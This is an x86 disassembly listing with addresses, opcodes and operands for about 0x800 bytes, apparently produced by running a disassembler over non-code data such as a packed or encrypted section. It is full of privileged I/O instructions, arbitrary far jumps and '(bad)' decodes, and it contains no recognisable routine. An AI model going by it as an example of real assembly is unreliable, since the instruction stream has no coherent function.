  414797:	test   DWORD PTR [eax],ebp
  414799:	sbb    esi,DWORD PTR [edx]
  41479b:	push   0x8fbad105
  4147a0:	imul   ebx,DWORD PTR [edi],0x2b
  4147a3:	mov    dl,0xe0
  4147a5:	inc    ebx
  4147a6:	mov    al,0x3d
  4147a8:	pop    eax
  4147a9:	cmc    
  4147aa:	hlt    
  4147ab:	and    al,0xb3
  4147ad:	pop    sp
  4147af:	int3   
  4147b0:	shl    BYTE PTR [edx],0x2d
  4147b3:	test   al,0x8c
  4147b5:	idiv   DWORD PTR [ebp-0x35]
  4147b8:	aad    0xdc
  4147ba:	mov    DWORD PTR ds:0xdc88ac29,ebx
  4147c0:	sub    BYTE PTR [edi-0x30b6875],dl
  4147c6:	ja     0x41475a
  4147c8:	popf   
  4147c9:	push   eax
  4147ca:	fcmovu st,st(7)
  4147cc:	out    0xb2,al
  4147ce:	outs   dx,BYTE PTR ds:[esi]
  4147cf:	mov    gs,WORD PTR [esi+0x4216e9c1]
  4147d5:	dec    esp
  4147d6:	shl    esp,1
  4147d8:	into   
  4147d9:	in     al,0x10
  4147db:	and    ecx,esi
  4147dd:	push   ss
  4147de:	jl     0x4147c0
  4147e0:	sti    
  4147e1:	stos   DWORD PTR es:[edi],eax
  4147e2:	mov    cl,0x88
  4147e4:	arpl   bx,di
  4147e6:	xor    esp,DWORD PTR [esp+edx*2+0x4e2e680d]
  4147ed:	lds    edx,FWORD PTR [edi+0x20]
  4147f0:	xchg   DWORD PTR [eax],esi
  4147f2:	fcomi  st,st(4)
  4147f4:	mov    dh,0x14
  4147f6:	xchg   ecx,eax
  4147f7:	jnp    0x41477a
  4147f9:	sub    DWORD PTR [edi+0x47],eax
  4147fc:	and    eax,0x14608bc5
  414801:	xchg   BYTE PTR [edi+0x34],bh
  414804:	pop    ebp
  414805:	jns    0x414868
  414807:	fld    QWORD PTR [edx+ebp*2+0x3d]
  41480b:	xor    BYTE PTR [esi],al
  41480d:	adc    ebx,DWORD PTR [ecx+0x5e]
  414810:	or     dl,BYTE PTR [ebx+0x5b]
  414813:	jns    0x414859
  414815:	dec    esi
  414816:	sub    ebp,0xffffffd5
  414819:	jl     0x4147ee
  41481b:	sub    al,0x24
  41481d:	inc    edi
  41481e:	pop    edx
  41481f:	inc    edx
  414820:	cmp    esp,ebx
  414822:	pop    es
  414823:	inc    edi
  414824:	scas   eax,DWORD PTR es:[edi]
  414825:	pushf  
  414826:	or     eax,0x4102c4f
  41482b:	mov    ds:0xab662bf9,al
  414830:	call   0xa112:0x13f6fe06
  414837:	adc    BYTE PTR [ecx+0x0],dh
  41483a:	fistp  QWORD PTR [eax+0x6d]
  41483d:	add    BYTE PTR [edx],bh
  41483f:	fimul  WORD PTR [ecx+0x16]
  414842:	ins    BYTE PTR es:[edi],dx
  414843:	mov    cs,WORD PTR [esi+0x3b]
  414846:	repz push cs
  414848:	mov    ah,0xb6
  41484a:	repz mov ecx,0x3307e9bf
  414850:	jns    0x4148b0
  414852:	(bad)  
  414855:	mov    bh,0xee
  414857:	test   ch,0x94
  41485a:	outs   dx,BYTE PTR ds:[esi]
  41485b:	push   ebp
  41485c:	pop    ebp
  41485d:	retf   
  41485e:	loope  0x414875
  414860:	shr    ebx,cl
  414862:	fwait
  414863:	out    0xd5,eax
  414865:	nop
  414866:	aas    
  414867:	pop    eax
  414868:	das    
  414869:	push   ebp
  41486a:	push   eax
  41486b:	pusha  
  41486c:	loopne 0x4148dd
  41486e:	sbb    al,0xbd
  414870:	xchg   BYTE PTR [ecx-0x61],cl
  414873:	xlat   BYTE PTR ds:[ebx]
  414874:	jmp    0x39fd:0x74019569
  41487b:	test   DWORD PTR [eax+0x20602726],esp
  414881:	ss sbb eax,0x8416611a
  414887:	push   eax
  414888:	inc    ebp
  414889:	mov    eax,ds:0x8ada5323
  41488e:	repnz sbb DWORD PTR [ebx-0x79],ecx
  414892:	mov    ds:0xb95a37a8,al
  414897:	out    dx,eax
  414898:	cmp    edi,esp
  41489a:	xor    BYTE PTR [ebp+0x6173a55f],al
  4148a0:	pusha  
  4148a1:	(bad)  
  4148a2:	out    0x78,al
  4148a4:	cwde   
  4148a5:	and    eax,0xfc835612
  4148aa:	imul   esi,ebx,0x71
  4148ad:	push   0xffffffaf
  4148af:	mov    ebp,0x4305c319
  4148b4:	mov    dh,BYTE PTR [eax+0x63f73188]
  4148ba:	repnz and BYTE PTR [edi],dh
  4148bd:	cld    
  4148be:	das    
  4148bf:	fld    DWORD PTR ds:0xe4f4c9
  4148c5:	push   ss
  4148c6:	lods   eax,DWORD PTR ds:[esi]
  4148c7:	xor    al,0xe2
  4148c9:	push   cs
  4148ca:	cmp    ebx,ecx
  4148cc:	rol    DWORD PTR [eax],cl
  4148ce:	rol    esi,0xc5
  4148d1:	inc    ecx
  4148d2:	call   0xc1bbe1a7
  4148d7:	add    al,0x8f
  4148d9:	mov    DWORD PTR [edi+ecx*2],esi
  4148dc:	inc    ecx
  4148dd:	push   ebp
  4148de:	dec    esp
  4148df:	push   0x610b8afb
  4148e4:	inc    esp
  4148e5:	aam    0x9d
  4148e7:	hlt    
  4148e8:	mov    bh,0x94
  4148ea:	jnp    0x414924
  4148ec:	inc    ebx
  4148ed:	ds jg  0x414941
  4148f0:	call   0xe6d79631
  4148f5:	xor    edi,DWORD PTR [esi]
  4148f7:	je     0x4148a0
  4148f9:	jae    0x4148e0
  4148fb:	shl    al,0xe
  4148fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148ff:	ret    
  414900:	pop    ebp
  414901:	or     al,0xa0
  414903:	and    BYTE PTR [eax+0x2a],bh
  414906:	push   esi
  414907:	daa    
  414908:	dec    ebp
  414909:	sar    BYTE PTR [ebx+0x3],cl
  41490c:	sub    DWORD PTR [ecx+ebx*1-0x53],0xffffffe6
  414911:	or     BYTE PTR [edi],al
  414913:	pop    ds
  414914:	mov    ds:0x78b5fec7,eax
  414919:	mov    al,ds:0x7fb0d352
  41491e:	cmp    DWORD PTR [edx],0x2e
  414921:	(bad)  
  414922:	out    0xd9,eax
  414924:	loope  0x414981
  414926:	cmp    bl,BYTE PTR [eax]
  414928:	fwait
  414929:	mov    esp,0xf22ac190
  41492e:	or     BYTE PTR [ecx-0x357db251],0xe2
  414935:	or     edi,DWORD PTR [ecx]
  414937:	inc    edx
  414938:	mov    BYTE PTR [ecx+esi*2+0x5c320270],0x82
  414940:	pop    edi
  414941:	daa    
  414942:	push   0x18
  414944:	sub    DWORD PTR ds:0x76166f2d,eax
  41494a:	push   0xffffffdc
  41494c:	add    edi,DWORD PTR [eax]
  41494e:	add    al,0x42
  414950:	pop    eax
  414951:	dec    esi
  414952:	ins    DWORD PTR es:[edi],dx
  414953:	in     al,0xff
  414955:	jne    0x4149b5
  414957:	ret    
  414958:	dec    ecx
  414959:	in     eax,0xbb
  41495b:	cwde   
  41495c:	fld    TBYTE PTR ds:0xeadabda7
  414962:	out    dx,al
  414963:	ins    DWORD PTR es:[edi],dx
  414964:	or     DWORD PTR [ebp-0x75c84d0c],esi
  41496a:	int3   
  41496b:	xchg   DWORD PTR [eax-0x2ca27500],ebp
  414971:	pop    eax
  414972:	pop    eax
  414973:	inc    ebp
  414974:	pop    ebx
  414975:	sti    
  414976:	jnp    0x41493d
  414978:	sub    DWORD PTR [eax],ebp
  41497a:	jle    0x41497a
  41497c:	lahf   
  41497d:	div    dh
  41497f:	aas    
  414980:	test   BYTE PTR [eax],dh
  414982:	mov    bl,0x89
  414984:	shr    cl,cl
  414986:	dec    esi
  414987:	sbb    BYTE PTR [eax],ah
  414989:	test   DWORD PTR [ebp+0x7e],esi
  41498c:	xchg   esi,eax
  41498d:	pop    esp
  41498e:	les    edx,FWORD PTR [ebx+0x69]
  414991:	mov    bh,0xe7
  414993:	shr    BYTE PTR [edx+0x20],0xd4
  414997:	inc    edx
  414998:	xor    edx,esi
  41499a:	sbb    dl,ah
  41499c:	in     eax,0x3
  41499e:	daa    
  41499f:	add    bl,BYTE PTR [edx+0x2ca92bb2]
  4149a5:	into   
  4149a6:	pop    edi
  4149a7:	sub    edi,esi
  4149a9:	mov    bl,0xff
  4149ab:	push   edi
  4149ac:	int    0xbc
  4149ae:	es inc esi
  4149b0:	jmp    FWORD PTR ds:0x33b68b4
  4149b6:	daa    
  4149b7:	mov    bl,dh
  4149b9:	test   eax,ebp
  4149bb:	jp     0x4149be
  4149bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149be:	enter  0x2036,0x3b
  4149c2:	add    al,0x14
  4149c4:	lahf   
  4149c5:	mov    ds:0xc5969479,eax
  4149ca:	ss mov eax,0x42bba041
  4149d0:	jmp    0xdc7f:0xd7713963
  4149d7:	cmp    dl,BYTE PTR [esi+0x5d]
  4149da:	mov    dh,0xd
  4149dc:	add    al,0x89
  4149de:	jecxz  0x414a38
  4149e0:	lock out 0x9b,eax
  4149e3:	jno    0x4149fa
  4149e5:	stc    
  4149e6:	aam    0x71
  4149e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149e9:	dec    ebp
  4149ea:	xchg   ebx,eax
  4149eb:	xor    DWORD PTR [edx+0xb],edx
  4149ee:	ret    0xf7ba
  4149f1:	push   ebp
  4149f2:	js     0x414a13
  4149f4:	cmp    DWORD PTR [ebx],0x4724c1ee
  4149fa:	ficomp DWORD PTR [eax-0x5b]
  4149fd:	jne    0x4149c6
  4149ff:	lahf   
  414a00:	into   
  414a01:	or     eax,0x58bfb6e7
  414a06:	mov    ds:0x54db2573,eax
  414a0b:	push   edi
  414a0c:	pushw  ds
  414a0e:	ins    DWORD PTR es:[edi],dx
  414a0f:	fimul  WORD PTR [ebx-0x1e4cc71a]
  414a15:	mov    dh,0xb8
  414a17:	in     eax,0xd0
  414a19:	mov    esi,0x90d33eb6
  414a1e:	jle    0x4149ef
  414a20:	(bad)  
  414a21:	sar    BYTE PTR [esi-0x16],cl
  414a24:	(bad)  
  414a27:	in     al,dx
  414a28:	in     al,dx
  414a29:	mov    WORD PTR [edx-0x14ba64b4],gs
  414a2f:	outs   dx,DWORD PTR ds:[esi]
  414a30:	in     al,0x17
  414a32:	jle    0x414a0c
  414a34:	(bad)  [eax+0x25]
  414a37:	mov    dl,0x3
  414a39:	mov    cl,0xca
  414a3b:	xor    eax,0xd44b0cd6
  414a40:	(bad)  
  414a41:	cld    
  414a42:	fistp  DWORD PTR [esi-0x50]
  414a45:	sub    eax,0xfb8d12d1
  414a4a:	jns    0x414a8b
  414a4c:	add    al,BYTE PTR [eax]
  414a4e:	inc    ecx
  414a4f:	outs   dx,BYTE PTR ds:[esi]
  414a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a51:	push   ss
  414a52:	push   edx
  414a53:	mov    eax,0x884129cf
  414a58:	add    al,BYTE PTR ds:0x68920053
  414a5e:	out    0x9f,eax
  414a60:	cs pop ss
  414a62:	add    al,0xb7
  414a64:	add    ch,BYTE PTR [ebx]
  414a66:	mov    fs,WORD PTR [esi-0x4]
  414a69:	pop    es
  414a6a:	jo     0x414a57
  414a6c:	xor    al,0x4e
  414a6e:	or     al,0x15
  414a70:	es sub eax,0x7e9039d8
  414a76:	enter  0x85f,0xcb
  414a7a:	out    dx,eax
  414a7b:	mov    edi,0xc83585d6
  414a80:	and    BYTE PTR [esi],0xb3
  414a83:	dec    ebx
  414a84:	inc    ebx
  414a85:	dec    edi
  414a86:	(bad)  
  414a87:	icebp  
  414a88:	lea    edi,[esp+edx*1]
  414a8b:	xor    BYTE PTR [esi-0x27565cfe],cl
  414a91:	(bad)  
  414a92:	loopne 0x414a2a
  414a94:	and    BYTE PTR [esi-0x16],al
  414a97:	in     eax,0x3
  414a99:	mov    esp,0xbd1732fe
  414a9e:	jmp    0x2a4ec00f
  414aa3:	push   cs
  414aa4:	push   0x6f
  414aa6:	cwde   
  414aa7:	dec    esi
  414aa8:	push   eax
  414aa9:	push   es
  414aaa:	scas   al,BYTE PTR es:[edi]
  414aab:	bound  esp,QWORD PTR [ecx]
  414aad:	int3   
  414aae:	imul   ebp,DWORD PTR [ebx-0x21],0x271bbda9
  414ab5:	push   cs
  414ab6:	(bad)  
  414ab7:	mov    edi,0x2809bef0
  414abc:	xchg   edx,eax
  414abd:	pop    ds
  414abe:	xor    al,BYTE PTR [esi+0x6e0e3341]
  414ac4:	jne    0x414a90
  414ac6:	push   0x3b
  414ac8:	jnp    0x414a7f
  414aca:	or     eax,0xfda4077b
  414acf:	int3   
  414ad0:	inc    ecx
  414ad1:	scas   al,BYTE PTR es:[edi]
  414ad2:	nop
  414ad3:	mov    esi,edx
  414ad5:	(bad)  
  414ad6:	mov    dl,0x17
  414ad8:	xchg   ebx,eax
  414ad9:	aad    0x6b
  414adb:	sbb    DWORD PTR [esi+0x31],ecx
  414ade:	ins    DWORD PTR es:[edi],dx
  414adf:	ficomp WORD PTR [esp+eax*2]
  414ae2:	dec    edi
  414ae3:	mov    esp,0x9b871e17
  414ae8:	push   ss
  414ae9:	xor    al,0xf8
  414aeb:	outs   dx,DWORD PTR ds:[esi]
  414aec:	sbb    al,0xeb
  414aee:	sbb    bl,al
  414af0:	pop    ebp
  414af1:	mov    eax,ds:0x4596a834
  414af6:	out    0x43,al
  414af8:	out    dx,al
  414af9:	lods   al,BYTE PTR ds:[esi]
  414afa:	ds jl  0x414b75
  414afd:	mov    ah,0xbb
  414aff:	into   
  414b00:	pop    ebp
  414b02:	mov    ecx,0x51996784
  414b07:	or     ebx,edx
  414b09:	retf   
  414b0a:	push   ss
  414b0b:	ss in  al,0x43
  414b0e:	mov    edx,DWORD PTR [ecx+0x5c21e870]
  414b14:	jl     0x414b36
  414b16:	jnp    0x414ab2
  414b18:	stos   BYTE PTR es:[edi],al
  414b19:	xchg   esi,eax
  414b1a:	pop    esp
  414b1b:	js     0x414abd
  414b1d:	jl     0x414b57
  414b1f:	scas   eax,DWORD PTR es:[edi]
  414b20:	dec    esp
  414b21:	pop    eax
  414b22:	lock pop ds
  414b24:	adc    dh,0xd6
  414b27:	push   0x2f
  414b29:	xchg   edx,eax
  414b2a:	sub    DWORD PTR [esi+0x523fe65d],edx
  414b30:	jp     0x414bad
  414b32:	sub    ch,BYTE PTR [edx]
  414b34:	mov    al,ds:0xd0b4e7b2
  414b39:	ret    0x18cb
  414b3c:	add    ecx,ebp
  414b3e:	and    al,0xaa
  414b40:	xchg   ecx,eax
  414b41:	pushf  
  414b42:	mov    ds:0x34cb9925,al
  414b47:	fucomip st,st(1)
  414b49:	aad    0xc0
  414b4b:	xchg   edi,eax
  414b4c:	and    BYTE PTR [ebx+0x41],bh
  414b4f:	pop    ebp
  414b50:	push   esp
  414b51:	sub    DWORD PTR [ebx-0x4f],eax
  414b54:	sbb    eax,0x55b1e076
  414b59:	fist   DWORD PTR [ebp+0x1c]
  414b5c:	cmp    eax,0x6d7c5807
  414b61:	ss pop es
  414b63:	push   ebx
  414b64:	pop    eax
  414b65:	or     al,0x62
  414b67:	and    dl,BYTE PTR ds:0x22b89009
  414b6d:	and    ebx,esp
  414b6f:	bound  edx,QWORD PTR [edi+0x50]
  414b72:	add    BYTE PTR ds:0xc27f8b35,dl
  414b78:	dec    ecx
  414b79:	cmc    
  414b7a:	xchg   esi,eax
  414b7b:	fstp   DWORD PTR [edx-0x42]
  414b7e:	cmc    
  414b7f:	add    al,0xbd
  414b81:	inc    esi
  414b82:	xor    al,0xd4
  414b84:	cld    
  414b85:	cmp    eax,0x7918c82
  414b8a:	mov    al,0xc3
  414b8c:	xor    al,0x6e
  414b8e:	sbb    BYTE PTR [ebp-0x5f7b327e],bh
  414b94:	mov    ebx,DWORD PTR [eax+0x1532ec59]
  414b9a:	int    0xfe
  414b9c:	leave  
  414b9d:	dec    esp
  414b9e:	and    edx,eax
  414ba0:	aas    
  414ba1:	mov    gs,esi
  414ba3:	pop    ecx
  414ba4:	cmp    dh,BYTE PTR [ecx+0x43b8ab2a]
  414baa:	xchg   DWORD PTR [edx+ecx*4-0x7c7b562d],ebx
  414bb1:	mov    WORD PTR [eax-0x26],ss
  414bb4:	gs push esp
  414bb6:	out    dx,al
  414bb7:	xchg   edx,eax
  414bb8:	cmp    al,0x61
  414bba:	jmp    0x414b6c
  414bbc:	pusha  
  414bbd:	std    
  414bbe:	jnp    0x414b51
  414bc0:	out    dx,al
  414bc1:	pop    ebp
  414bc2:	inc    edx
  414bc3:	fisttp QWORD PTR [esp+esi*8+0x152fdab3]
  414bca:	mov    ebp,0xe702beac
  414bcf:	jns    0x414b68
  414bd1:	sbb    DWORD PTR [ebx],ebx
  414bd3:	pop    eax
  414bd4:	dec    edi
  414bd5:	out    0x50,al
  414bd7:	in     eax,dx
  414bd8:	data16 mov al,ds:0x692d6361
  414bde:	xchg   esi,eax
  414bdf:	std    
  414be0:	xor    BYTE PTR [esi],0x3e
  414be3:	jg     0x414b6b
  414be5:	xchg   esp,eax
  414be6:	ds js  0x414be9
  414be9:	test   BYTE PTR ds:0x8046c3a1,dh
  414bef:	ret    0xfdb
  414bf2:	xor    DWORD PTR ds:0x104a78a6,0x627b6a18
  414bfc:	test   BYTE PTR [eax-0x37f6908f],cl
  414c02:	dec    eax
  414c03:	imul   ebp,DWORD PTR [esi+0x7f],0x700155e8
  414c0a:	int3   
  414c0b:	jns    0x414bc2
  414c0d:	inc    esp
  414c0e:	xchg   DWORD PTR [ebp+esi*4-0x31],eax
  414c12:	int    0x66
  414c14:	fmul   DWORD PTR [esi+0x6b]
  414c17:	out    0xff,eax
  414c19:	sub    eax,0x4af1a7da
  414c1e:	not    esp
  414c20:	sub    ch,dl
  414c22:	dec    ebp
  414c23:	sbb    esi,esi
  414c25:	or     DWORD PTR [edx],ebx
  414c27:	loop   0x414c42
  414c29:	mov    ecx,0x833099f3
  414c2e:	std    
  414c2f:	fmul   DWORD PTR [ebp-0x2e]
  414c32:	fbld   TBYTE PTR [edx+0xf]
  414c35:	je     0x414c14
  414c37:	dec    BYTE PTR ds:0x7057e6cb
  414c3d:	repnz idiv BYTE PTR [eax]
  414c40:	push   0x1124500b
  414c45:	pop    ss
  414c46:	mov    bl,0xf9
  414c48:	jmp    0xad93cfc8
  414c4d:	fild   WORD PTR [ecx-0x47]
  414c50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c51:	mov    ds:0x6ce2f4fd,al
  414c56:	push   0xebb1b6f
  414c5b:	enter  0xc57d,0x8d
  414c5f:	rcr    BYTE PTR [ebp-0x50],0x37
  414c63:	dec    ebp
  414c64:	mov    WORD PTR [ecx+edi*8-0x537f5d7d],gs
  414c6b:	ss (bad) 
  414c6d:	mov    eax,0xab127b4a
  414c72:	inc    eax
  414c73:	pop    edi
  414c74:	jl     0x414c2e
  414c76:	push   edx
  414c77:	jbe    0x414cd1
  414c79:	pop    ecx
  414c7a:	rcl    dl,0x65
  414c7d:	pop    esp
  414c7e:	adc    DWORD PTR [eax],edx
  414c80:	rcl    BYTE PTR [edi+0x47],1
  414c83:	pusha  
  414c84:	or     edx,DWORD PTR [ebx+ebp*4+0x3d]
  414c88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c89:	mov    ch,0xb6
  414c8b:	in     al,dx
  414c8c:	or     eax,0x153bf4c4
  414c91:	or     edx,DWORD PTR [esi]
  414c93:	pop    ebp
  414c94:	leave  
  414c95:	xchg   BYTE PTR [ecx+0x7],dl
  414c98:	popf   
  414c99:	sar    DWORD PTR [ebx-0x12],1
  414c9c:	js     0x414c23
  414c9e:	retf   0x5f5f
  414ca1:	mov    edi,DWORD PTR [ebp-0x6d]
  414ca4:	pop    eax
  414ca5:	mov    bh,0x5e
  414ca7:	adc    eax,0x4322dde3
  414cac:	and    ecx,DWORD PTR [ebp+0x5d5c4bca]
  414cb2:	frstor [esi]
  414cb4:	jle    0x414cef
  414cb6:	mov    ebx,0x3b0effe7
  414cbb:	ds fsubrp st(6),st
  414cbe:	xor    BYTE PTR [edi-0x4890aceb],dl
  414cc4:	out    dx,al
  414cc5:	aad    0x14
  414cc7:	rol    bl,1
  414cc9:	jne    0x414d47
  414ccb:	mov    dl,BYTE PTR [ebp-0x78932622]
  414cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cd2:	retf   0xb4e4
  414cd5:	cmp    ch,0x61
  414cd8:	fs dec edi
  414cda:	in     eax,0xe
  414cdc:	cmp    ch,al
  414cde:	mov    bl,0x32
  414ce0:	aad    0xe5
  414ce2:	outs   dx,DWORD PTR ds:[esi]
  414ce3:	imul   eax,DWORD PTR [ebx],0x10
  414ce6:	mov    ecx,0x871c745e
  414ceb:	mov    WORD PTR [ebp-0x68],cs
  414cee:	test   bl,dh
  414cf0:	mov    ch,0x44
  414cf2:	test   eax,0x7d2e2ea5
  414cf7:	lds    edi,FWORD PTR [edx]
  414cf9:	cmp    ebp,DWORD PTR [esi]
  414cfb:	(bad)  
  414cfc:	mov    ch,0x6d
  414cfe:	sub    BYTE PTR [edx-0x26],0x65
  414d02:	and    ch,dh
  414d04:	sahf   
  414d05:	xor    BYTE PTR [eax+eax*2-0x1e],0x3e
  414d0a:	cmp    BYTE PTR [edi-0x47abd4e2],al
  414d10:	cdq    
  414d11:	ja     0x414c95
  414d13:	fmul   QWORD PTR [ebp-0x3a70fd3c]
  414d19:	mov    eax,0x7cb34888
  414d1e:	mov    dh,0x61
  414d20:	setp   BYTE PTR [edx+0x6a34a0ba]
  414d27:	jecxz  0x414cff
  414d29:	rol    DWORD PTR [esp+ebp*4+0x44dc72d3],0xb4
  414d31:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  414d33:	pop    ecx
  414d34:	xchg   ebx,eax
  414d35:	jmp    0xfa54ccb
  414d3a:	jns    0x414cdd
  414d3c:	arpl   ax,bx
  414d3e:	or     eax,0xe35c0b79
  414d43:	lds    ebx,FWORD PTR [esp+ecx*4-0x1596e9e7]
  414d4a:	pop    ecx
  414d4b:	cmp    eax,0xc7246a01
  414d50:	test   eax,0x27a333e8
  414d55:	mov    ebx,0xe1005db8
  414d5a:	push   ecx
  414d5b:	or     BYTE PTR [edx-0x48],0x50
  414d5f:	jns    0x414d7f
  414d61:	sbb    eax,0xdcd7ad58
  414d66:	(bad)  
  414d67:	sbb    esp,ebp
  414d69:	jnp    0x414ddf
  414d6b:	sbb    ch,bl
  414d6d:	fist   DWORD PTR [edi]
  414d6f:	mov    ss,WORD PTR [esi-0x5b31e49a]
  414d75:	cmc    
  414d76:	pushw  ds
  414d78:	in     al,dx
  414d79:	xchg   DWORD PTR [ebx+esi*8],esp
  414d7c:	out    0x21,al
  414d7e:	mov    edi,0x32b1a0b7
  414d83:	jno    0x414d78
  414d85:	and    DWORD PTR [eax-0x42dbbc11],ebp
  414d8b:	imul   esi,DWORD PTR [ebx+0x3a9cdbab],0x6945a62f
  414d95:	mov    ds:0xc199ecb8,eax
  414d9a:	dec    ecx
  414d9b:	push   ecx
  414d9c:	mov    dl,BYTE PTR [ebx]
  414d9e:	xor    BYTE PTR [ecx+0x2d],bh
  414da1:	mov    al,0xef
  414da3:	xor    ebx,esp
  414da5:	frstor [edx-0x2f127a22]
  414dab:	sbb    eax,0x2667997c
  414db0:	sti    
  414db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414db2:	pop    edx
  414db3:	into   
  414db4:	jmp    0xc174:0xfbdb7b66
  414dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dbc:	adc    al,0x20
  414dbe:	xchg   ebx,eax
  414dbf:	or     DWORD PTR [eax-0x6821c180],ebp
  414dc5:	add    dl,BYTE PTR [esi-0x27]
  414dc8:	push   eax
  414dc9:	shl    DWORD PTR [edx+0x54f7d518],0xa8
  414dd0:	rep outs dx,BYTE PTR ds:[esi]
  414dd2:	shl    DWORD PTR [ebx+0x1b9d81fa],1
  414dd8:	pop    sp
  414dda:	sahf   
  414ddb:	(bad)  
  414ddc:	pop    edx
  414ddd:	or     esi,ebp
  414ddf:	xchg   ebx,eax
  414de0:	sbb    BYTE PTR [ebp-0x17d868e5],ah
  414de6:	xor    al,0x4f
  414de8:	push   edi
  414de9:	out    0x1a,eax
  414deb:	test   DWORD PTR [eax-0x7f34951e],eax
  414df1:	xchg   DWORD PTR [ecx-0x55436a28],esi
  414df7:	ss mov esp,0xdc1b0c78
  414dfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dfe:	sbb    ch,ah
  414e00:	sub    eax,0xf3cfdb1f
  414e05:	cmp    al,0x6e
  414e07:	mov    eax,0xb607af30
  414e0c:	in     eax,dx
  414e0d:	js     0x414e37
  414e0f:	sub    eax,DWORD PTR [eax-0x5c]
  414e12:	xor    dl,BYTE PTR [edx-0x2859f0f4]
  414e18:	nop
  414e19:	push   edi
  414e1a:	mov    dl,0xea
  414e1c:	xor    ebx,esi
  414e1e:	jo     0x414e59
  414e20:	mov    edx,0xe7ff3f22
  414e25:	int    0xf3
  414e27:	push   0xbf41dc36
  414e2c:	adc    DWORD PTR [edx],ebp
  414e2e:	scas   eax,DWORD PTR es:[edi]
  414e2f:	leave  
  414e30:	cmc    
  414e31:	popa   
  414e32:	jns    0x414dbe
  414e34:	sbb    BYTE PTR [eax],dl
  414e36:	jb     0x414ea2
  414e38:	pop    ds
  414e39:	sti    
  414e3a:	pop    ss
  414e3b:	adc    eax,DWORD PTR [edi-0x1be001ae]
  414e41:	(bad)  
  414e42:	test   DWORD PTR [ebp-0x7ff41a07],0xb5877eb8
  414e4c:	les    edi,FWORD PTR [ebp+0x29e1c315]
  414e52:	call   0x2dc0:0x59224b27
  414e59:	mov    bl,0x9
  414e5b:	pop    ecx
  414e5c:	xor    DWORD PTR [edx+0x7d45ea99],ebx
  414e62:	(bad)  
  414e63:	js     0x414df0
  414e65:	push   esp
  414e66:	aad    0x2
  414e68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e69:	push   0xf38d6d34
  414e6e:	mov    dh,0x12
  414e70:	(bad)  
  414e71:	ins    DWORD PTR es:[edi],dx
  414e72:	sub    ebp,DWORD PTR [esi+0x16]
  414e75:	pop    ebp
  414e76:	mov    bh,0x6d
  414e78:	or     ch,BYTE PTR [edi-0x77]
  414e7b:	cli    
  414e7c:	lahf   
  414e7d:	push   ds
  414e7e:	repnz sub eax,0xdcedbdfa
  414e84:	push   ss
  414e85:	fimul  WORD PTR [ebx]
  414e87:	mov    dl,0x65
  414e89:	xchg   edi,eax
  414e8a:	cmp    BYTE PTR [ebp+0x7a6bb98d],al
  414e90:	jge    0x414eea
  414e92:	(bad)
  414e95:	xchg   edi,eax
  414e96:	add    al,0x22
  414e98:	push   edx
  414e99:	inc    edi
  414e9a:	lods   al,BYTE PTR ds:[esi]
  414e9b:	fnsave [ebx-0x7de8af44]
  414ea1:	xchg   ebx,eax
  414ea2:	push   es
  414ea3:	mov    ah,0xbe
  414ea5:	push   0x6bdbff78
  414eaa:	mov    ds:0x3ea06592,eax
  414eaf:	out    0x75,al
  414eb1:	imul   eax,DWORD PTR [ebx-0x3a54e5b1],0x3d
  414eb8:	sahf   
  414eb9:	mov    al,ds:0xb096fa6a
  414ebe:	lock iret 
  414ec0:	dec    ecx
  414ec1:	pusha  
  414ec2:	cmp    ah,BYTE PTR [ebp+0x20]
  414ec5:	dec    esi
  414ec6:	jge    0x414f37
  414ec8:	jnp    0x414f0c
  414eca:	jb     0x414e7c
  414ecc:	pop    es
  414ecd:	xor    DWORD PTR [eax],0xffffff98
  414ed0:	sti    
  414ed1:	jmp    0xccc5:0x1368d11b
  414ed8:	nop
  414ed9:	imul   eax,DWORD PTR [ecx],0x1c
  414edc:	shl    BYTE PTR [eax+0x1e3275de],1
  414ee2:	leave  
  414ee3:	iret   
  414ee4:	cmp    eax,0xfcdbaf1d
  414ee9:	pop    esi
  414eea:	jge    0x414ed6
  414eec:	mov    esp,0xcaa44823
  414ef1:	cmp    BYTE PTR [esi+0x40],0xd5
  414ef5:	xchg   esp,eax
  414ef6:	aaa    
  414ef7:	enter  0x4f97,0x7
  414efb:	dec    esp
  414efc:	(bad)  
  414efd:	in     eax,dx
  414efe:	dec    esi
  414eff:	lock xor al,0xaa
  414f02:	pushw  ss
  414f04:	push   ds
  414f05:	and    DWORD PTR [edi+0x4dd0d8d3],ebp
  414f0b:	stos   DWORD PTR es:[edi],eax
  414f0c:	xchg   ecx,eax
  414f0d:	cmp    edx,esp
  414f0f:	mov    WORD PTR [ecx],es
  414f11:	aam    0x68
  414f13:	cmp    cl,BYTE PTR [ecx+0x56]
  414f16:	leave  
  414f17:	shl    DWORD PTR [ebx],cl
  414f19:	lock mov edi,0xd95634c3
  414f1f:	into   
  414f20:	push   ds
  414f21:	add    ebp,eax
  414f23:	test   al,0x87
  414f25:	rol    BYTE PTR [ebp+0x448c2d03],1
  414f2b:	sub    al,0x35
  414f2d:	mov    ebx,0xc1ce8c3d
  414f32:	out    0xa6,eax
  414f34:	lahf   
  414f35:	xchg   esi,eax
  414f36:	or     ah,BYTE PTR [edi-0x164ae422]
  414f3c:	test   DWORD PTR [edx],eax
  414f3e:	stc    
  414f3f:	mov    cl,bh
  414f41:	adc    DWORD PTR [eax-0x7a],edx
  414f44:	sbb    ebp,DWORD PTR [edx+esi*8]
  414f47:	mov    ah,0x50
  414f49:	popa   
  414f4a:	add    al,0xfe
  414f4c:	jmp    0x414f86
  414f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f4f:	cdq    
  414f50:	inc    ebx
  414f51:	add    bh,bl
  414f53:	cdq    
  414f54:	sub    dh,BYTE PTR [esi+0x1bf66d41]
  414f5a:	cli    
  414f5b:	lea    eax,[si-0x259]
